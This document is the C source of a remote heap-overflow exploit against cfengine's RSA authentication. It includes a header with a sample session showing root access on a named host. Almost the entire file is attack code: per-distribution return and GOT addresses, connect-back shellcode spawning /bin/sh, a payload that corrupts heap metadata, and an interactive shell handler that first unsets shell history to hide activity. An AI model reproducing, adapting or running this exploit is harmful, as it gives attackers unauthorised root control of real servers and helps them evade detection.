/*           _ ________            _____                        ______
 *
 * cfengine rsa heap remote exploit  part of PTjob project / \  / "fuck mm"
 * by jsk:exworm(http://exworm.hostrocket.com)            \/
 * bug found by core
 * yep ta mei dayong ..hehe..so pub it..
 * my home: www.ph4nt0m.org
 * GT: emm.oyxin.seal.ava.haggis.b_root.more..
 * No girl No money  No jop...
 * bash-2.05b# ./cf_0day -t 1 -h 192.168.31.23
 * cfengine rsa heap remote exploit ....s
 * --------------------------------------------------(need money.to..fk..girl..)
 * [+] lisntener...
 * [+] Connected, sending code...
 * [+] Ret: 0x0819f03e
 * [+] Got: 0x0811a590
 * [+] ownedbyOseen!
 * -----------------------------------------------------------
 * Linux ns2.autson.com 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686 unknown
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 *(wheel)
 *
 *
 */

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <getopt.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <linux/sockios.h>

#define BUF 1024


struct {
        char *distro;
        char *type;
        unsigned long ret;
        unsigned long got;

} targets[] = { /*got is free of rsafree() ,get it by yourself to own more machine ;) */
        { "Redhat 7.3 ", "cfengine 2.1.7p1  ",0x0819f03e , 0x0811a590 },
        { "redhat 9.0  ", "cfengine 2.1.7p1", **********, ********** },  ( hehe:use fast-bin tips)
        { "Redhat  7.2  ", "cfengine 2.17p1 ", 0x080d1c78, 0x0806d0e3 },
        { "Redhat 7.1     ", "cfengine 2.17p1", 0x080d11e0, 0x082bc090 },
        { "Crash          ", "(All platforms)  ", 0x42424242, 0x41414141 },
};
char linux_connect_back[] =  /* connect back 45295 */
 "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";
int sock;
void usage();
void shell();




void
usage(char *prog)
{

         fprintf(stderr,"Usage: %s -t [-pah]\n",prog);
        fprintf(stderr,"-t version       Linux version.\n");
        fprintf(stderr,"-h target       The host to attack.\n");
         fprintf(stderr,"-a password     Default password is \"sorry no password. \".\n");
        fprintf(stderr,"-p port         Default port is 5803.\n\n");
}

int
openhost(char *host,int port)
{
        struct sockaddr_in addr;
        struct hostent *he;

        he=gethostbyname(host);

        if (he==NULL) return -1;
        sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
        if (sock==-1) return -1;

        memcpy(&addr.sin_addr, he->h_addr, he->h_length);

        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);

        if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
        sock=-1;
        return sock;
}


void
shell(int sock)
{
        fd_set  fd_read;
        char buff[1024], *cmd="unset HISTFILE; /bin/uname -a;/usr/bin/id; echo '*** oseen are chinese...'\n";
        int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock, &fd_read);
                FD_SET(0,    &fd_read);

                if (select(sock+1, &fd_read, NULL, NULL, NULL) < 0) break;

                if (FD_ISSET(sock, &fd_read)) {
                        if ((n = recv(sock, buff, sizeof(buff), 0)) < 0){
                                fprintf(stderr, "[+] EOF\n");
                                exit(2);
                        }

                        if (write(1, buff, n) <0) break;
                }

                if (FD_ISSET(0, &fd_read)) {
                        if ((n = read(0, buff, sizeof(buff))) < 0){
                                fprintf(stderr,"[+] EOF\n");
                                exit(2);
                        }

                        if (send(sock, buff, n, 0) < 0) break;
                }
        }

        fprintf(stderr,"[+] Connection lost.\n\n");
        exit(0);
}

unsigned char
*get_my_ip_addr(int sockfd, struct ifreq *ifr)
{
        struct sockaddr_in sin;
        char *b = (char *) malloc(4);

        if (ioctl(sockfd ,SIOCGIFADDR,ifr) < 0) {
                fprintf(stderr, "Unable to get the local IP Address, use -d.\n");
                exit(1);
        }

        memcpy(&sin, &ifr->ifr_addr, sizeof(struct sockaddr_in));
        memcpy(b, (char *) &sin.sin_addr.s_addr, 4);
        return b;
}





int
main (int argc,char *argv[])
{
        char buf1[512];
        char buf2[512];
        char host[256];
        char pass[256]="changeme";
        char data;



        int  type= 0;
        int c=0;
        int port=8001;
        char device[256] = "eth0";
        unsigned char *ptr;

        struct hostent *hp;
        struct sockaddr_in sin_listener;
        struct ifreq ifr;
        struct timeval timeout;

        fd_set fdread;

        int delay       = 12;
        int i           = 0;
        int mode        = 0;
        int local_port  = 0;
        int opt         = 0;
        int ret         = 0;
        int sin_len     = sizeof (struct sockaddr_in);
        int sock        = 0;
        int sock2       = 0;
        int sockd       = 0;
        int listener    = 0;
        int time_out    = 4;
        int tmp         = 0;

        srand(getpid());

        fprintf(stdout,"cfengine rsa heap remote exploit ....s\n");
        fprintf(stdout,"--------------------------------------------------(need money.to..fk..girl..)\n");

        while((c=getopt(argc,argv,"h:p:a:t:")) !=EOF)
        {
                switch(c)
                {
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n\n");
                                        exit(1);
                                }
                                break;
                        case 'a':
                                memset(pass,0x0,sizeof(pass));
                                strncpy(pass,optarg,sizeof(pass) - 1);
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type > sizeof(targets) / 28) {
                                        for(i = 0; i < sizeof(targets) / 28; i++)
                                        fprintf(stderr, "%02d. %s - %s      [0x%08x - 0x%08x]\n",
                                                i + 1, targets[i].distro, targets[i].type, targets[i].ret, targets[i].got);
                                        return -1;
                                }
                                break;
                        case 'h':
                                memset(host,0x0,sizeof(host));
                                strncpy(host,optarg,sizeof(host) - 1);
                                break;

                        default:
                                usage(argv[0]);
                                exit(1);
                                break;
                }
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;

        if (strlen(host) == 0) {
                usage(argv[0]);
                exit(1);
        }
        sock=openhost(host, 5308);

        if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

        strncpy(ifr.ifr_name, device, 15);

        if ((sockd = socket(AF_INET, SOCK_DGRAM, 17)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        if ((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        ptr = get_my_ip_addr(sockd, &ifr);
       memcpy(&sin_listener.sin_addr.s_addr, ptr, 4);

        sin_listener.sin_family = AF_INET;
        memset(&sin_listener.sin_zero, 0x00, 8);

        while(1) {
                local_port = local_port = 45295;
                sin_listener.sin_port = htons(local_port);
                if (!bind(listener, (struct sockaddr *) &sin_listener, sin_len)) break;
        }



        listen(listener, 1);
        fprintf(stdout, "[+] lisntener...\n");
        linux_connect_back[33] = (unsigned int) *(ptr + 0);
        linux_connect_back[34] = (unsigned int) *(ptr + 1);
        linux_connect_back[35] = (unsigned int) *(ptr + 2);
        linux_connect_back[36] = (unsigned int) *(ptr + 3);



        memset(buf2,  0x0, sizeof(buf2));
        memset(buf1, 0x90, sizeof(buf1));

        for(i=0;i < strlen(linux_connect_back); i++) buf1[i+50] = linux_connect_back[i];

        buf1[0] = (0x41414141 & 0x000000ff);
        buf1[1] = (0x41414141 & 0x0000ff00) >> 8;
        buf1[2] = (0x41414141 & 0x00ff0000) >> 16;
        buf1[3] = (0x41414141 & 0xff000000) >> 24;

        buf1[4] = (0x58585858 & 0x000000ff);
        buf1[5] = (0x58585858 & 0x0000ff00) >> 8;
        buf1[6] = (0x58585858 & 0x00ff0000) >> 16;
        buf1[7] = (0x58585858 & 0xff000000) >> 24;

        buf1[8] = (0xfffffffc & 0x000000ff);
        buf1[9] = (0xfffffffc & 0x0000ff00) >> 8;
        buf1[10] = (0xfffffffc & 0x00ff0000) >> 16;
        buf1[11] = (0xfffffffc & 0xff000000) >> 24;

        buf1[12] = (0xffffffff & 0x000000ff);
        buf1[13] = (0xffffffff & 0x0000ff00) >> 8;
        buf1[14] = (0xffffffff & 0x00ff0000) >> 16;
        buf1[15] = (0xffffffff & 0xff000000) >> 24;

        buf1[16] = (targets[type - 1].got -12 & 0x000000ff);
        buf1[17] = (targets[type - 1].got -12 & 0x0000ff00) >> 8;
        buf1[18] = (targets[type - 1].got -12 & 0x00ff0000) >> 16;
        buf1[19] = (targets[type - 1].got -12 & 0xff000000) >> 24;

        buf1[20] = (targets[type - 1].ret & 0x000000ff);
        buf1[21] = (targets[type - 1].ret & 0x0000ff00) >> 8;
        buf1[22] = (targets[type - 1].ret & 0x00ff0000) >> 16;
        buf1[23] = (targets[type - 1].ret & 0xff000000) >> 24;


      for(i = 0; i < 300 - sizeof(linux_connect_back) -80; i+=2)
      {
        buf1[i + 24] = 0x7f;
        buf1[i + 25] = 0xeb;
      }
      for(; i < 300 - sizeof(linux_connect_back) - 1; i++)
        buf1[i + 24] = 0x90;
      strcpy(buf1 + i + 24, linux_connect_back);
      buf1[i + 24+ sizeof(linux_connect_back) - 1] = '\n';
      buf1[i + 25 + sizeof(linux_connect_back) - 1] = '\0';



         sprintf(buf2,   "k0000023CAUTH HARE KRISHNA HAREk0003000SAUTH n00000010 00001000%s\r\n", buf1);

        fprintf(stdout, "Connected, sending code...\n");
        fprintf(stdout, "[+] Ret: 0x%08x\n", targets[type - 1].ret);
        fprintf(stdout, "[+] Got: 0x%08x\n", targets[type - 1].got);
 while(1) {
                write(sock, buf2, strlen(buf2));
                close(sock);
                sleep(2);
                FD_ZERO(&fdread);
                FD_SET(listener, &fdread);

                timeout.tv_sec = time_out;
                timeout.tv_usec = 0;

                while(1) {

                        ret = select(FD_SETSIZE, &fdread, NULL, NULL, &timeout);

                        if (ret < 0) {
                                close(sock);
                                close(listener);
                                fprintf(stderr, "select() error.\n");
                                return -1;
                        }

                        if (ret == 0) {
                                fprintf(stderr, "[+] Failed, waiting %d seconds.\n"
                                                "[+] Use ctrl-c to abort.\n", delay);
                                sleep(delay);
                                break;
                        }

                        if(FD_ISSET(listener, &fdread)) {
                                sock2 = accept(listener, (struct sockaddr *)&sin_listener, &sin_len);
                                close(sock);
                                close(listener);

                                fprintf(stderr, "[+] ownedbyOseen!\n"
                                                "-----------------------------------------------------------\n");
                                shell(sock2);
                                close(sock2);
                                return 0;
                        }
                }

        }

        fprintf(stderr, "[+] Exploit failed.\n");
        close(listener);
        close(sock);
        return 0;

}

